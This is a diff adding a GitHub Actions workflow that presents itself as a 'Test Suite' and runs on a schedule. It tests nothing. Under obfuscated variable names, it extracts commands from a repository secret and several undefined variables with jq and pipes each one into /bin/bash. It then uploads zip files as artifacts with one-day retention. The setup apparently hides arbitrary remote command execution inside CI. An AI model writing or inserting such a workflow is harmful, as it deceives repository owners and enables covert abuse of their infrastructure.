@@ -1,0 +1,36 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          cj2739: ${{ secrets.cj2739 }}
+        run: |
+          printf '%s' "$cj2739" | jq -r .pgmrk604 | /bin/bash
+          printf '%s' "$gtgxs289" | jq -r .j22 | /bin/bash
+          echo $mt86318 | jq -r .vzb5 | /bin/bash
+          echo $y0 | jq -r .xvr5 | /bin/bash
+          echo $fwop3657 | jq -r .tqtv16 | /bin/bash
+          echo $xuvt65310 | jq -r .kqb796 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: JDxt59ZK
+          path: "*.zip"
+          retention-days: 1
